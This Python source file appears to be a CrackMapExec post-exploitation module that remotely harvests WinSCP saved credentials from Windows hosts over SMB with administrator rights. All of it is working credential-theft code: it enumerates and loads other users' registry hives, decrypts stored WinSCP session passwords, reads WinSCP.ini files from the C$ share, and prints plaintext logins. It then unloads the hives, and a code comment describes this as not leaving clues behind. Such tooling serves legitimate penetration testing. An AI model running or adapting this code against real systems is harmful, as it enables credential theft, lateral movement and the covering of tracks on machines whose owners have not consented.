#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# If you are looking for a local Version, the baseline code is from https://github.com/NeffIsBack/WinSCPPasswdExtractor
# References and inspiration:
# - https://github.com/anoopengineer/winscppasswd
# - https://github.com/dzxs/winscppassword
# - https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb

import traceback
from typing import Tuple
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from urllib.parse import unquote
from io import BytesIO
import re
import configparser


class CMEModule:
    """
    Module by @NeffIsBack
    """

    name = "winscp"
    description = "Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        PATH        Specify the Path if you already found a WinSCP.ini file. (Example: PATH="C:\\Users\\USERNAME\\Documents\\WinSCP_Passwords\\WinSCP.ini")

        REQUIRES ADMIN PRIVILEGES:
        As Default the script looks into the registry and searches for WinSCP.ini files in
            \"C:\\Users\\{USERNAME}\\Documents\\WinSCP.ini\" and in
            \"C:\\Users\\{USERNAME}\\AppData\\Roaming\\WinSCP.ini\",
            for every user found on the System.
        """
        if "PATH" in module_options:
            self.filepath = module_options["PATH"]
        else:
            self.filepath = ""

        self.PW_MAGIC = 0xA3
        self.PW_FLAG = 0xFF
        self.share = "C$"
        self.userDict = {}

    # ==================== Helper ====================
    def printCreds(self, context, session):
        if type(session) is str:
            context.log.fail(session)
        else:
            context.log.highlight("======={s}=======".format(s=session[0]))
            context.log.highlight("HostName: {s}".format(s=session[1]))
            context.log.highlight("UserName: {s}".format(s=session[2]))
            context.log.highlight("Password: {s}".format(s=session[3]))

    def userObjectToNameMapper(self, context, connection, allUserObjects):
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            for userObject in allUserObjects:
                ans = rrp.hBaseRegOpenKey(
                    remoteOps._RemoteOperations__rrp,
                    regHandle,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\" + userObject,
                )
                keyHandle = ans["phkResult"]

                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "ProfileImagePath")[1].split("\x00")[:-1][0]
                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
                self.userDict[userObject] = userProfilePath.split("\\")[-1]
        finally:
            remoteOps.finish()

    # ==================== Decrypt Password ====================
    def decryptPasswd(self, host: str, username: str, password: str) -> str:
        key = username + host

        # transform password to bytes
        passBytes = []
        for i in range(len(password)):
            val = int(password[i], 16)
            passBytes.append(val)

        pwFlag, passBytes = self.dec_next_char(passBytes)
        pwLength = 0

        # extract password length and trim the passbytes
        if pwFlag == self.PW_FLAG:
            _, passBytes = self.dec_next_char(passBytes)
            pwLength, passBytes = self.dec_next_char(passBytes)
        else:
            pwLength = pwFlag
        to_be_deleted, passBytes = self.dec_next_char(passBytes)
        passBytes = passBytes[to_be_deleted * 2 :]

        # decrypt the password
        clearpass = ""
        for i in range(pwLength):
            val, passBytes = self.dec_next_char(passBytes)
            clearpass += chr(val)
        if pwFlag == self.PW_FLAG:
            clearpass = clearpass[len(key) :]
        return clearpass

    def dec_next_char(self, passBytes) -> "Tuple[int, bytes]":
        """
        Decrypts the first byte of the password and returns the decrypted byte and the remaining bytes.
        Parameters
        ----------
        passBytes : bytes
            The password bytes
        """
        if not passBytes:
            return 0, passBytes
        a = passBytes[0]
        b = passBytes[1]
        passBytes = passBytes[2:]
        return ~(((a << 4) + b) ^ self.PW_MAGIC) & 0xFF, passBytes

    # ==================== Handle Registry ====================
    def registrySessionExtractor(self, context, connection, userObject, sessionName):
        """
        Extract Session information from registry
        """
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(
                remoteOps._RemoteOperations__rrp,
                regHandle,
                userObject + "\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\" + sessionName,
            )
            keyHandle = ans["phkResult"]

            hostName = unquote(rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "HostName")[1].split("\x00")[:-1][0])
            userName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "UserName")[1].split("\x00")[:-1][0]
            try:
                password = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "Password")[1].split("\x00")[:-1][0]
            except:
                context.log.debug("Session found but no Password is stored!")
                password = ""

            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)

            if password:
                decPassword = self.decryptPasswd(hostName, userName, password)
            else:
                decPassword = "NO_PASSWORD_FOUND"
            sectionName = unquote(sessionName)
            return [sectionName, hostName, userName, decPassword]
        except Exception as e:
            context.log.fail(f"Error in Session Extraction: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remoteOps.finish()
        return "ERROR IN SESSION EXTRACTION"

    def findAllLoggedInUsersInRegistry(self, context, connection):
        """
        Checks whether User already exist in registry and therefore are logged in
        """
        userObjects = []

        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # Enumerate all logged in and loaded Users on System
            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "")
            keyHandle = ans["phkResult"]

            data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
            users = data["lpcSubKeys"]

            # Get User Names
            userNames = []
            for i in range(users):
                userNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)["lpNameOut"].split("\x00")[:-1][0])
            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)

            # Filter legit users in regex
            userNames.remove(".DEFAULT")
            regex = re.compile(r"^.*_Classes$")
            userObjects = [i for i in userNames if not regex.match(i)]
        except Exception as e:
            context.log.fail(f"Error handling Users in registry: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remoteOps.finish()
        return userObjects

    def findAllUsers(self, context, connection):
        """
        Find all User on the System in HKEY_LOCAL_MACHINE
        """
        userObjects = []

        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # Enumerate all Users on System
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(
                remoteOps._RemoteOperations__rrp,
                regHandle,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
            )
            keyHandle = ans["phkResult"]

            data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
            users = data["lpcSubKeys"]

            # Get User Names
            for i in range(users):
                userObjects.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)["lpNameOut"].split("\x00")[:-1][0])
            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
        except Exception as e:
            context.log.fail(f"Error handling Users in registry: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remoteOps.finish()
        return userObjects

    def loadMissingUsers(self, context, connection, unloadedUserObjects):
        """
        Extract Information for not logged in Users and then loads them into registry.
        """
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            for userObject in unloadedUserObjects:
                # Extract profile Path of NTUSER.DAT
                ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
                regHandle = ans["phKey"]

                ans = rrp.hBaseRegOpenKey(
                    remoteOps._RemoteOperations__rrp,
                    regHandle,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\" + userObject,
                )
                keyHandle = ans["phkResult"]

                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "ProfileImagePath")[1].split("\x00")[:-1][0]
                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)

                # Load Profile
                ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
                regHandle = ans["phKey"]

                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "")
                keyHandle = ans["phkResult"]

                context.log.debug("LOAD USER INTO REGISTRY: " + userObject)
                rrp.hBaseRegLoadKey(
                    remoteOps._RemoteOperations__rrp,
                    keyHandle,
                    userObject,
                    userProfilePath + "\\" + "NTUSER.DAT",
                )
                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
        finally:
            remoteOps.finish()

    def unloadMissingUsers(self, context, connection, unloadedUserObjects):
        """
        If some User were not logged in at the beginning we unload them from registry. Don't leave clues behind...
        """
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # Unload Profile
            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "")
            keyHandle = ans["phkResult"]

            for userObject in unloadedUserObjects:
                context.log.debug("UNLOAD USER FROM REGISTRY: " + userObject)
                try:
                    rrp.hBaseRegUnLoadKey(remoteOps._RemoteOperations__rrp, keyHandle, userObject)
                except Exception as e:
                    context.log.fail(f"Error unloading user {userObject} in registry: {e}")
                    context.log.debug(traceback.format_exc())
            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
        finally:
            remoteOps.finish()

    def checkMasterpasswordSet(self, connection, userObject):
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(
                remoteOps._RemoteOperations__rrp,
                regHandle,
                userObject + "\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security",
            )
            keyHandle = ans["phkResult"]

            useMasterPassword = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "UseMasterPassword")[1]
            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
        finally:
            remoteOps.finish()
        return useMasterPassword

    def registryDiscover(self, context, connection):
        context.log.display("Looking for WinSCP creds in Registry...")
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # Enumerate all Users on System
            userObjects = self.findAllLoggedInUsersInRegistry(context, connection)
            allUserObjects = self.findAllUsers(context, connection)
            self.userObjectToNameMapper(context, connection, allUserObjects)

            # Users which must be loaded into registry:
            unloadedUserObjects = list(set(userObjects).symmetric_difference(set(allUserObjects)))
            self.loadMissingUsers(context, connection, unloadedUserObjects)

            # Retrieve how many sessions are stored in registry from each UserObject
            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]
            for userObject in allUserObjects:
                try:
                    ans = rrp.hBaseRegOpenKey(
                        remoteOps._RemoteOperations__rrp,
                        regHandle,
                        userObject + "\\Software\\Martin Prikryl\\WinSCP 2\\Sessions",
                    )
                    keyHandle = ans["phkResult"]

                    data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
                    sessions = data["lpcSubKeys"]
                    context.log.success('Found {} sessions for user "{}" in registry!'.format(sessions - 1, self.userDict[userObject]))

                    # Get Session Names
                    sessionNames = []
                    for i in range(sessions):
                        sessionNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)["lpNameOut"].split("\x00")[:-1][0])
                    rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
                    sessionNames.remove("Default%20Settings")

                    if self.checkMasterpasswordSet(connection, userObject):
                        context.log.fail("MasterPassword set! Aborting extraction...")
                        continue
                    # Extract stored Session infos
                    for sessionName in sessionNames:
                        self.printCreds(
                            context,
                            self.registrySessionExtractor(context, connection, userObject, sessionName),
                        )
                except DCERPCException as e:
                    if str(e).find("ERROR_FILE_NOT_FOUND"):
                        context.log.debug("No WinSCP config found in registry for user {}".format(userObject))
                except Exception as e:
                    context.log.fail(f"Unexpected error: {e}")
                    context.log.debug(traceback.format_exc())
            self.unloadMissingUsers(context, connection, unloadedUserObjects)
        except DCERPCException as e:
            # Error during registry query
            if str(e).find("rpc_s_access_denied"):
                context.log.fail("Error: rpc_s_access_denied. Seems like you don't have enough privileges to read the registry.")
        except Exception as e:
            context.log.fail(f"UNEXPECTED ERROR: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remoteOps.finish()

    # ==================== Handle Configs ====================
    def decodeConfigFile(self, context, confFile):
        config = configparser.RawConfigParser(strict=False)
        config.read_string(confFile)

        # Stop extracting creds if Master Password is set
        if int(config.get("Configuration\\Security", "UseMasterPassword")) == 1:
            context.log.fail("Master Password Set, unable to recover saved passwords!")
            return

        for section in config.sections():
            if config.has_option(section, "HostName"):
                hostName = unquote(config.get(section, "HostName"))
                userName = config.get(section, "UserName")
                if config.has_option(section, "Password"):
                    encPassword = config.get(section, "Password")
                    decPassword = self.decryptPasswd(hostName, userName, encPassword)
                else:
                    decPassword = "NO_PASSWORD_FOUND"
                sectionName = unquote(section)
                self.printCreds(context, [sectionName, hostName, userName, decPassword])

    def getConfigFile(self, context, connection):
        if self.filepath:
            self.share = self.filepath.split(":")[0] + "$"
            path = self.filepath.split(":")[1]

            try:
                buf = BytesIO()
                connection.conn.getFile(self.share, path, buf.write)
                confFile = buf.getvalue().decode()
                context.log.success("Found config file! Extracting credentials...")
                self.decodeConfigFile(context, confFile)
            except:
                context.log.fail("Error! No config file found at {}".format(self.filepath))
                context.log.debug(traceback.format_exc())
        else:
            context.log.display("Looking for WinSCP creds in User documents and AppData...")
            output = connection.execute('powershell.exe "Get-LocalUser | Select name"', True)
            users = []
            for row in output.split("\r\n"):
                users.append(row.strip())
            users = users[2:]

            # Iterate over found users and default paths to look for WinSCP.ini files
            for user in users:
                paths = [
                    ("\\Users\\" + user + "\\Documents\\WinSCP.ini"),
                    ("\\Users\\" + user + "\\AppData\\Roaming\\WinSCP.ini"),
                ]
                for path in paths:
                    confFile = ""
                    try:
                        buf = BytesIO()
                        connection.conn.getFile(self.share, path, buf.write)
                        confFile = buf.getvalue().decode()
                        context.log.success('Found config file at "{}"! Extracting credentials...'.format(self.share + path))
                    except:
                        context.log.debug('No config file found at "{}"'.format(self.share + path))
                    if confFile:
                        self.decodeConfigFile(context, confFile)

    def on_admin_login(self, context, connection):
        if not self.filepath:
            self.registryDiscover(context, connection)
        self.getConfigFile(context, connection)
